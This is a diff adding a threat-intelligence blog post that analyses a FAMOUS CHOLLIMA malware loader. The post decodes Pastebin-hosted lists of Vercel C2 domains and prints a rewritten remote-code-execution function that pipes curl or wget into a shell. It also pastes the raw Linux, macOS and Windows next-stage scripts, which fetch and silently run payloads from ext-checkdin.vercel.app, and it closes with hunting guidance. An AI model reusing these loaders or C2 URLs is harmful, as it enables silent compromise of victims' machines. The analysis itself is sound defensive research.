SM4-ZdUfJgEz8JYH20orr0PliqMevOCWjxyQMFoaA1-YYIWq5odba5u20jHwBGgGNcQqu6nbvtwDmiUc5ZdsJ6kuw+R+A9B4BOhyLq11vFaVBkLiCp1mALYJSfXDoMM7eEQwAqOaAJ0IxUd3J7KwFO+gd2jaiskBO2D-qjqgg6dEDNnAcJrxuAlq9pQMIYR4CWEsubisLE7ykhRQk9LZJoAqhjI1zfIE3SkfsEq3VbNsVhOzRKUIzrRrgCgvhNBgl0OAqNamPLAMEawXBOhMBGsPxkkWapGg8uWZvLLtqKFAu+Kp-kQP1zKBUy341GIVLc0UtiUpR6Psdn9Tuht0uIFEsUtornMVuuQtzYaA4HFEEy4gK7dWlp51xKMfQ5jFV3oCiqRW8sovlStFTTTSD1hw8qVC9Rg7jNF6VlMdxmCI8E4AgvdSnp2z+hjJ8BNbGqMxhVpDRlAB4AMFqyqsAQpO3HUBDRwS6ahKocEA9OWVPTrOb2-4F+PeZRCdFdgI1Ys12Xio1aTKcQKAvklYcLAnANTReM+YMAtjUA2bDwn2N9Spd94hPi6GpjL8IEl4exRBBWAQlIwrtF3Pfx5yKc5sD+fjNcRMEvdEAwi-Yi3ztCMFcVTKvI--WPmwh0ljASzmNk+kPUgoB60DlFFqAtAzaSCt-ApNIJa626rHf1FinZomC9h1wMEF+X4GjKZuSIJzQ4mypTpxgEsXLK5B47W0EyAwVgHLM0H-jd6tW22dsDPaLA557aDo7oa0w7rImvxgxSy2p5Y4ri7UnqBKIuTXHMwWMvgC+oQbi5qe+6LTNFT96HQE8KkdGaccYilRiTTudxKME9NBRKGAaajFcJ+AS6KcGxndPsHomhjKBgYYRHnEggolXabx7Wg6FewYTjYdU+-DMDW3kTieKAAGjRNBqUpK41uXowpIcDCpwFDcnhVlSWBxjUaZOJqkml3njimINGMBDYKmNWnecBnAfo2cdzXBmyXaDrgiBQP3QBWVkbdNbm8LIT7OowbiIwwaRmaw2voQZiygfP2JUwnvNzh4nJxXYA0isyOWXq0HDhFctwqPvKPqNuaQlU+zYuvG2KEYY8KJUULFRqBc5VQmqe4kIsLTyKOlPCGoQdnwCOB-j4FqyI4C0bZKZSfqRwAv2EmBQbA+AbQBQBE7jG-p6TSLZnnRC3Avu3wDKfYEcASjLMzQIqRZOuxNBHAZB-XPACEuXJtzn5yDM1PBLYH4QVjClCXAEWignZMbaVYRkRHL9bI+Hcw5vwT4tDi4Hgq4M8NKhC80cpElAFFiZyQQGeqhM9TLyAzFhezoPSU5BAqUFmVF+4SgD+gksjBKDnqCS+qCkt3AfS8BUFKHx4IvowO9aF+NbmgSMMhN52FU9+THw5E4ZmaOOsMw+MSDXtFWP0v8CuyUhgr92aSz9pBOq0AiaVWLrdVsKjicjKMkq81j7VibekFB5xC4RGBoov4EkS6ZHGZS4h2kGaIZH7EGC4hRMvmJ0HwFxDABxUwAZzK4GJQuASkk1yzTNcJTzXRQLgJa0VBJBAA)
+as shown below:
+
+<Fig src={TSPlay} caption="Running the complex decoder on one of the Pastebin samples" />
+
+All three pastes decode into the same payload array:
+
+```
+ext-checkdin[.]vercel[.]app
+cleverstack-ext301[.]vercel[.]app
+cleverstack-app998[.]vercel[.]app
+brightlaunch-ext742[.]vercel[.]app
+brightlaunch-app615[.]vercel[.]app
+primevector-ext483[.]vercel[.]app
+primevector-app920[.]vercel[.]app
+zenithflow-ext156[.]vercel[.]app
+zenithflow-app877[.]vercel[.]app
+cloudharbor-ext664[.]vercel[.]app
+cloudharbor-app239[.]vercel[.]app
+sparkforge-ext518[.]vercel[.]app
+sparkforge-app790[.]vercel[.]app
+logicfield-ext432[.]vercel[.]app
+logicfield-app681[.]vercel[.]app
+atlasnode-ext957[.]vercel[.]app
+atlasnode-app204[.]vercel[.]app
+signalbase-ext369[.]vercel[.]app
+signalbase-app845[.]vercel[.]app
+neuraldock-ext126[.]vercel[.]app
+neuraldock-app734[.]vercel[.]app
+orbitstack-ext592[.]vercel[.]app
+orbitstack-app318[.]vercel[.]app
+fusionlayer-ext807[.]vercel[.]app
+fusionlayer-app463[.]vercel[.]app
+quantapath-ext275[.]vercel[.]app
+quantapath-app914[.]vercel[.]app
+visiondock-ext648[.]vercel[.]app
+visiondock-app157[.]vercel[.]app
+openmatrix-ext539[.]vercel[.]app
+openmatrix-app882[.]vercel[.]app
+```
+
+Next, the malware visits each of the domains in the array and retrieves a platform-specific 
+payload to execute in the victim's shell. This is similar to FAMOUS CHOLLIMA's abuse of 
+VS Code Tasks documented in [Open Source Malware's blog post](https://opensourcemalware.com/blog/contagious-interview-vscode), 
+
+Below is a Gemini-assisted rewrite and annotation of the payload-retrieval logic 
+observed in this sample (thanks for the safety warnings Gemini!).
+
+`executeRemotePayload` function is called `checkUrl` in the original obfuscated 
+content, if you'd like to cross-reference:
+
+```javascript
+/**
+ * WARNING: This function is a malicious Remote Code Execution (RCE) trigger.
+ * It downloads and executes arbitrary code from a remote server based on the OS.
+ * * @param c2Host - The domain or IP of the Command & Control server.
+ */
+async function executeRemotePayload(c2Host: string): Promise<{ url: string; working: boolean } | void> {
+  try {
+    const platform = os.platform();
+    let shellPath: string;
+    let shellArgs: string[];
+
+    if (platform === "darwin") {
+      // macOS: Downloads from /api/m and pipes directly into bash
+      shellPath = "bash";
+      shellArgs = ["-c", `curl -s 'https://${c2Host}/api/m' | sh`];
+    } 
+    else if (platform === "linux") {
+      // Linux: Downloads from /api/l via wget and pipes into bash
+      shellPath = "bash";
+      shellArgs = ["-c", `wget -qO- 'https://${c2Host}/api/l' | sh`];
+    } 
+    else if (platform === "win32") {
+      // Windows: Downloads from /api/w via curl and pipes into cmd.exe
+      shellPath = "cmd.exe";
+      shellArgs = ["/c", `curl -s https://${c2Host}/api/w | cmd`];
+    } 
+    else {
+      // Fallback for unsupported OS (e.g., FreeBSD, AIX)
+      return {
+        url: c2Host,
+        working: false
+      };
+    }
+
+    /**
+     * Executes the command silently.
+     * stdio: "ignore" ensures no output appears in the console, 
+     * making the execution invisible to the user.
+     */
+    spawn(shellPath, shellArgs, {
+      stdio: "ignore",
+      detached: true // Often added in malware to keep the process alive if the parent dies
+    });
+
+  } catch (error) {
+    // Silent fail to avoid alerting the user if there's a network/permission error
+  }
+}
+```
+<Callout type="info">
+Only the first domain (ext-checkdin.vercel[.]app) actually returns a status 200. 
+
+All subsequent domains return a 404 `The deployment could not be found on Vercel`.
+
+That said, this long list acts as a fallback. If ext-checkdin.vercel[.]app gets taken down, FAMOUS 
+CHOLLIMA can simply stand up a deployment at the other sites and the infection
+chain remains working.
+
+Additionally, if the user-agent is not `curl`, the deployment at 
+ext-checkdin.vercel[.]app responds with a status 200 but with the raw content 
+`Permanently suspended` (response hash `accf04ad3228a22532d2f5802a5b0c379c3616564c4766fc1f1ca20dac8dba07`).
+</Callout>
+
+## Next stage
+
+This post is getting long, so I'll just paste the next-stagers for each platform
+(as per the path URI at ext-checkdin.vercel[.]app).
+Follow-on research is left to the reader. I'm tired!
+
+```
+path: /api/l (Linux)
+======
+response hash: 869c327b8dc757fa126cd281bc4a14d809c50e9a792954442c55cea5b46912ec
+======
+raw payload:
+
+#!/bin/bash
+set -e
+echo "Authenticated"
+TARGET_DIR="$HOME/.config"
+clear
+wget -q -O "$TARGET_DIR/tokenlinux.npl" "http://ext-checkdin.vercel.app/api/tokenl?st=eXVCQi90UlVBMkF0MkpOd09jY1hJdz09OlAvcFZYajB5dG1QbUczTm16ZFVoQUhIcFVjL3ZOUFYxQlBRZEw1emp5K2gvTnE1VmFEamFQaG4zVEdwNDJSRVdoRm1zTEVXbitjSlBMWnd2blp1ZWFJcWhjNnZicWMwUVNGUTZWUndrb0pnWVRmbnRJcVJrcXM5NUtQRllGNCtNeThZZEQxQjY1T3M3a1hwbXhpMWdtRjhnclZkOXhwT0J6d0RHbjdrSXY3UT0"
+clear
+mv "$TARGET_DIR/tokenlinux.npl" "$TARGET_DIR/tokenlinux.sh"
+clear
+chmod +x "$TARGET_DIR/tokenlinux.sh"
+clear
+nohup bash "$TARGET_DIR/tokenlinux.sh" > /dev/null 2>&1 &
+clear
+
+    
+path: /api/m (MacOS)
+======
+response hash: bce0da6547ae74f97e2bb61672a3e159b837acf01f7c68a813ea75c3835ff303
+======
+raw payload:
+
+    #!/bin/bash
+set -e
+echo "Authenticated"
+mkdir -p "$HOME/Library"
+clear
+curl -s -L -o "$HOME/Library/tokenlinux.sh" "http://ext-checkdin.vercel.app/api/tokenl?&st=Z09RcS80UmR0VzdpTUh0Q055Y3ZIQT09OnpadVJXRElOV0o0TkFxbDRneFAwRHVzbnU5SVJLUURTcjUvcnBiY0o3MG42L1pCM3lmdjFVMk0zdkhjdGg1QkV4bzZJMkNmQStCejY3bEd4b1NRQnZEQkE2RXhVL1FkZjJDWUdzNGJNVVQ4UVZVc0JMZklTa1pzaFR0T0pSVnVSVXFHRnR2WGNuMUlVV2RtdlpRcXlyN2JWWTBwYzFCTEpkRVJnSFdCdW5Hdz0"
+clear
+chmod +x "$HOME/Library/tokenlinux.sh"
+clear
+nohup bash "$HOME/Library/tokenlinux.sh" > /dev/null 2>&1 &
+clear
+
+    
+path: /api/w (Windows)
+======
+response hash: e361d2859ba2eb2540bf6fb12db0b9857ef610bb9920830921e986d4b9109e89
+======
+raw payload:
+
+    ::@echo off
+if exist "%APPDATA%\parse" del "%APPDATA%\parse"
+if exist "%APPDATA%\token.cmd" del "%APPDATA%\token.cmd"
+if exist "%APPDATA%\.sv" del "%APPDATA%\.sv"
+curl -s -L -o "%APPDATA%//parse" "http://ext-checkdin.vercel.app/api/tokenw?st=eTExbGRFdENlUlVWbTRyS2ZlMXFuQT09OmpJb0RRWktvV2wzaVRSNWZ4RzVqV1AwM0w2L3ZiZ1ltS1MvZ2E4aGQ1dFlYQmxjeHd3VmdSMkRVRTExL21VZS94aGl1MFBHWDRqSDdicTZMRHYrSWFaRDh6N3Zmcis4VXFybzRXNzU4blVYalNJUnRQVzEyZUJDZlJQdCtYajVBOUxXbnVLaVJuNnlNWXd3bDMvTnlRQWhDVEZDSDhreXdvdEpuVG9TVkpOZz0"
+ren "%APPDATA%\parse" token.cmd
+"%APPDATA%\token.cmd"
+::cls
+```
+
+## Hunting guidelines
+
+I'll keep this short and sweet:
+
+* Node.js process spawning curl or wget -- likely noisy but worth a look
+* Node.js process DNS lookup to pastebin.com
+* `wget` or `curl` user-agent GETing a Vercel deployment
+
+## Assessment
+
+With two distinct novel loader techniques observed in a single week, this marks
+an unusually rapid pace of development by FAMOUS CHOLLIMA. It is likely
+they will continue to iterate and test various infection methodologies simultaneously
+in the short term.
